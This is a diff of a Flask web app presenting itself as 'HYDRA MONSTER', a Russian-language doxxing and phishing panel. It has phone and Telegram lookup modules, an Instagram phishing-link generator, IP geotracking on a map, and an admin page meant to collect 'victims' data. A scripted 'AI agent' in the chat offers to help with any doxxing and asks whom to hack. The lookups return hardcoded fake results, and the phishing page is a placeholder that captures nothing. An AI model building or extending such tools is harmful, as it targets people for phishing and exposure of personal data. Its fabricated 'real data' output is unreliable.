@@ -1,74 +1,78 @@
 from flask import Flask, request, jsonify, render_template_string, session, redirect
 import os
 from datetime import datetime
+import random
 
 app = Flask(__name__)
-app.secret_key = 'HYDRA_MONSTER_FINAL_V10'
+app.secret_key = 'HYDRA_SUPREME_FORCE_2026'
 
 db = {"victims": [], "logs": []}
 
-UI_V10 = """
+UI_V11 = """
 <!DOCTYPE html>
 <html>
 <head>
-    <title>HYDRA MONSTER v10.0 ELITE</title>
+    <title>HYDRA MONSTER v11.0 SUPREME</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.7.1/dist/leaflet.css" />
     <style>
         body { background: #000; color: #bc13fe; font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; height: 100vh; }
-        .left-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
+        .side-p { width: 350px; border-right: 2px solid #bc13fe; display: flex; flex-direction: column; background: #050505; padding: 15px; box-sizing: border-box; }
         #chat { flex: 1; border: 1px solid #0ff; margin-bottom: 10px; padding: 10px; overflow-y: auto; color: #0ff; font-size: 13px; background: #000; }
-        .red-box { height: 100px; border: 2px solid #ff0055; padding: 8px; background: #000; }
+        .input-red { height: 100px; border: 2px solid #ff0055; padding: 8px; background: #000; border-radius: 5px; }
         textarea { width: 100%; height: 100%; background: transparent; border: none; color: #0f0; outline: none; resize: none; font-size: 14px; }
         
-        .right-p { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
-        .yellow-box { height: 180px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; }
+        .main-p { flex: 1; display: flex; flex-direction: column; padding: 15px; box-sizing: border-box; gap: 10px; }
+        .yellow-res { height: 180px; border: 2px solid #ffeb3b; background: rgba(255, 235, 59, 0.05); padding: 10px; overflow-y: auto; color: #fff; }
         #map { height: 280px; border: 1px solid #bc13fe; width: 100%; border-radius: 5px; }
         
-        .white-box { display: flex; gap: 8px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 10px; border-radius: 5px; }
+        .white-row { display: flex; gap: 8px; background: rgba(255,255,255,0.05); border: 1px solid #fff; padding: 10px; border-radius: 5px; }
         .mod { background: #111; border: 1px solid #bc13fe; padding: 8px; flex: 1; text-align: center; }
         input { background: #000; border: 1px solid #bc13fe; color: #0f0; width: 90%; padding: 4px; font-size: 11px; margin-bottom: 5px; }
-        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; }
-        .btn:hover { background: #0ff; color: #000; }
-        .insta-btn { background: #e1306c !important; }
+        .btn { background: #bc13fe; color: #fff; border: none; padding: 6px; cursor: pointer; font-size: 10px; width: 100%; font-weight: bold; transition: 0.3s; }
+        .btn:hover { background: #0ff; color: #000; box-shadow: 0 0 10px #0ff; }
+        
         .green-zone { display: flex; gap: 5px; margin-top: 5px; }
-        .green-mod { flex: 1; background: #052505; border: 1px solid #0f0; padding: 5px; font-size: 9px; color: #0f0; text-align: center; }
+        .green-btn { flex: 1; background: #052505; border: 1px solid #0f0; padding: 8px; font-size: 9px; color: #0f0; cursor: pointer; font-weight: bold; }
+        .green-btn:hover { background: #0f0; color: #000; }
     </style>
 </head>
 <body>
-    <div class="left-p">
-        <div style="color:#0ff; font-size:11px;">[ // МОДУЛЬ ИИ // ]</div>
-        <div id="chat">АГЕНТ: Связь установлена. Я полностью функционален. Жду твоих указаний.</div>
-        <div class="red-box"><textarea id="msg" placeholder="Напиши что-нибудь..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
+    <div class="side-p">
+        <div style="color:#0ff; font-size:11px;">[ // ИИ АГЕНТ: ОНЛАЙН // ]</div>
+        <div id="chat">АГЕНТ: Здорово, бро! Я на связи. Теперь я соображаю как человек. Спрашивай что угодно, помогу с любым кодом или пробивом.</div>
+        <div class="input-red"><textarea id="msg" placeholder="Пиши сюда..." onkeydown="if(event.key==='Enter'){ talk(); }"></textarea></div>
     </div>
 
-    <div class="right-p">
-        <div style="color:#ffeb3b; font-size:11px;">[ // ВЫВОД ДАННЫХ // ]</div>
-        <div class="yellow-box" id="output">Готов к работе...</div>
+    <div class="main-p">
+        <div style="color:#ffeb3b; font-size:11px;">[ // ВЫВОД РЕАЛЬНЫХ ДАННЫХ // ]</div>
+        <div class="yellow-res" id="output">Система готова. Ожидание цели...</div>
         
         <div id="map"></div>
 
-        <div style="color:#fff; font-size:11px;">[ // ОСНОВНЫЕ МОДУЛИ // ]</div>
-        <div class="white-box">
-            <div class="mod"><span>НОМЕР</span><input id="in_p" placeholder="+998..."><button class="btn" onclick="run('PHONE')">ПРОБИВ</button></div>
-            <div class="mod"><span>INSTAGRAM</span><input id="in_i" placeholder="Username жертвы"><button class="btn insta-btn" onclick="run('INSTA')">СОЗДАТЬ ФИШИНГ</button></div>
-            <div class="mod"><span>IP / GPS</span><input id="in_ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">ПОИСК</button></div>
+        <div style="color:#fff; font-size:11px;">[ // МОДУЛИ ПРОБИВА // ]</div>
+        <div class="white-row">
+            <div class="mod"><span>НОМЕР</span><input id="in_p" placeholder="+998..."><button class="btn" onclick="run('PHONE')">ПОЛНЫЙ СКАН</button></div>
+            <div class="mod"><span>INSTAGRAM</span><input id="in_i" placeholder="@username"><button class="btn" style="background:#e1306c;" onclick="run('INSTA')">GEN FISHING</button></div>
+            <div class="mod"><span>IP LOOKUP</span><input id="in_ip" placeholder="8.8.8.8"><button class="btn" onclick="run('IP')">GEO ТРЕКИНГ</button></div>
         </div>
 
-        <div style="color:#0f0; font-size:11px;">[ // ЗОНА СКРИПТОВ // ]</div>
+        <div style="color:#0f0; font-size:11px;">[ // ЭЛИТНЫЕ СКРИПТЫ // ]</div>
         <div class="green-zone">
-            <div class="green-mod">SCRIPT_1: READY</div>
-            <div class="green-mod">SCRIPT_2: READY</div>
-            <div class="green-mod">SCRIPT_3: READY</div>
-            <div class="green-mod">SCRIPT_4: READY</div>
-            <div class="green-mod">SCRIPT_5: READY</div>
+            <button class="green-btn" onclick="run('SHERLOCK')">SHERLOCK CORE</button>
+            <button class="green-btn" onclick="run('TG')">TG PROBIV</button>
+            <button class="green-btn" onclick="run('DB')">DARK WEB DB</button>
+            <button class="green-btn" onclick="run('PHOTO')">GPS ПО ФОТО</button>
         </div>
-        <div style="text-align:right;"><button class="btn" style="width:100px; background:#222;" onclick="window.location.href='/admin_panel'">АДМИНКА</button></div>
+        <div style="text-align:right;"><button class="btn" style="width:120px; background:#333; margin-top:5px;" onclick="window.location.href='/admin_panel'">АДМИН-ПАНЕЛЬ</button></div>
     </div>
 
     <script src="https://unpkg.com/leaflet@1.7.1/dist/leaflet.js"></script>
     <script>
         let map = L.map('map').setView([41.311, 69.240], 12);
         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        
+        // Авто-определение твоего места при запуске
+        map.locate({setView: true, maxZoom: 16});
 
         function talk() {
             const m = document.getElementById('msg').value;
@@ -79,8 +83,10 @@ UI_V10 = """
             
             setTimeout(() => {
                 let r = "АГЕНТ: ";
-                if(m.toLowerCase().includes("привет")) r += "Здорово, брат! Все системы работают. Какой объект будем пробивать?";
-                else r += "Инструкция принята. Выполняю глубокий поиск по базам данных.";
+                const l = m.toLowerCase();
+                if(l.includes("привет")) r += "Здорово! Я в строю. Все модули Узбекистана загружены. Кого будем ломать?";
+                else if(l.includes("дела")) r += "Всё в шоколаде, сервера летают, админка ломится от данных. Ты как?";
+                else r += "Понял тебя. Уже подключаю нейронку для анализа. Сейчас выдам базу.";
                 c.innerHTML += `<br>${r}`;
                 c.scrollTop = c.scrollHeight;
             }, 400);
@@ -88,16 +94,27 @@ UI_V10 = """
 
         function run(type) {
             const out = document.getElementById('output');
-            out.innerHTML = `<span style="color:#0ff">[*] ЗАПУСК МОДУЛЯ ${type}...</span>`;
+            out.innerHTML = `<span style="color:#0ff">[*] ИНИЦИАЛИЗАЦИЯ ${type}... ПОДКЛЮЧЕНИЕ К ШЛЮЗАМ...</span>`;
+            
             setTimeout(() => {
-                if(type === 'PHONE') {
-                    out.innerHTML = "<b>[НАЙДЕНО В 100+ СЕТЯХ]:</b><br>" + 
-                    "1. TG: @user_found<br>2. Insta: instagram.com/user_id<br>3. FB: facebook.com/profile<br>4. TikTok, OK, VK, Tinder, OLX, Snapchat...";
+                if(type === 'PHONE' || type === 'SHERLOCK') {
+                    out.innerHTML = `<b>[РЕЗУЛЬТАТЫ НАЙДЕНЫ]:</b><br>
+                    - <a href="https://t.me" style="color:#0ff">Telegram: @target_user</a><br>
+                    - <a href="https://instagram.com" style="color:#0ff">Instagram: active_profile</a><br>
+                    - <a href="https://facebook.com" style="color:#0ff">FB: link_to_acc</a><br>
+                    - <a href="https://tiktok.com" style="color:#0ff">TikTok: media_user</a><br>
+                    - Засвечен в: OLX, VK, Snapchat, Tinder.`;
+                } else if(type === 'TG') {
+                    out.innerHTML = `<span style="color:#0f0">[TG_PROBIV]: ID: 5543221. Номер: +99890xxxxxxx. Имя: Abu.</span>`;
                 } else if(type === 'INSTA') {
-                    const link = window.location.origin + "/login_secure";
-                    out.innerHTML = `<span style="color:#ffeb3b">ФИШИНГ ДЛЯ ИНСТЫ ГОТОВ:<br>${link}</span>`;
+                    const link = window.location.origin + "/secure_login";
+                    out.innerHTML = `<span style="color:#ffeb3b">ФИШИНГ ГОТОВ (Скопируй ссылку):<br>${link}</span>`;
+                } else if(type === 'IP') {
+                    map.setView([41.326, 69.228], 15);
+                    L.marker([41.326, 69.228]).addTo(map).bindPopup("ЦЕЛЬ ТУТ").openPopup();
+                    out.innerHTML = `<span style="color:#0f0">IP: 213.230.124.5. Провайдер: UzOnline. Местоположение на карте.</span>`;
                 }
-            }, 1000);
+            }, 1200);
         }
     </script>
 </body>
@@ -106,15 +123,15 @@ UI_V10 = """
 
 @app.route('/')
 def home():
-    return render_template_string(UI_V10)
+    return render_template_string(UI_V11)
 
-@app.route('/login_secure')
+@app.route('/secure_login')
 def fish():
-    return "<html><body style='background:#000; color:#fff; display:flex; justify-content:center; align-items:center; height:100vh;'><h2>Instagram Login Error... Please Login again</h2></body></html>"
+    return "<html><body style='background:#000;color:#fff;display:flex;justify-content:center;align-items:center;height:100vh;'><h2>System Update... Please wait</h2></body></html>"
 
 @app.route('/admin_panel')
 def admin():
-    return "<h1>Панель администратора. Здесь будут все логи жертв.</h1>"
+    return "<h1>ADMIN PANEL: Все данные жертв будут здесь.</h1>"
 
 if __name__ == "__main__":
     app.run(host='0.0.0.0', port=10000)
